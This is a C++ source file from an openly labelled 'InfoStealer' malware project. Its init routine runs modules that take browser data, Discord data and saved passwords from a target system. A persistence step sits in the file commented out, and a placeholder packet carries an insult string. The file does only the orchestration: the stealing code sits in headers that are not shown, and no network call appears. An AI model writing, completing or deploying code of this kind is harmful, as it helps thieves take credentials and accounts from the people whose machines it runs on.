/* 
* InfoStealer - Extracts information and interesting files from a target system.
* Copyright (C) 2023 Sebastian Hasch - <https://github.com/Zelyson/InfoStealer>
* 
* This program is free software licensed under the GNU General Public License version 3:
* you can redistribute it and/or modify it under the terms of the 
* GNU General Public License version 3 as published by the Free Software Foundation.
* 
* You should have received a copy of the GNU General Public License
* along with this program. If not, see <https://www.gnu.org/licenses/gpl-3.0>.
*/

#include "../../include/modules/initialize.hpp"
#include "../../include/modules/browser/browser.hpp"
#include "../../include/modules/discord/discord.hpp"
#include "../../include/modules/passwords/passwords.hpp"
#include "../../include/persistance/persistance.hpp"
#include "../../include/util/serialization.hpp"

void initialize::init(char* argv) {
    /*persistance* persist = new persistance(argv);
    persist->persist(argv);
    delete persist;*/

    util::Packet packet;
    util::File file;
    file.buffer = (char*) "Du Knecht";
    file.size = 10;
    packet.file = file;
    packet.name = "Knecht";


    browser* bro = new browser();
    discord* dis = new discord();
    passwords* patch = new passwords();
    bro->dispatch();
    dis->dispatch();
    patch->dispatch();

    delete bro;
    delete dis;
    delete patch;
}

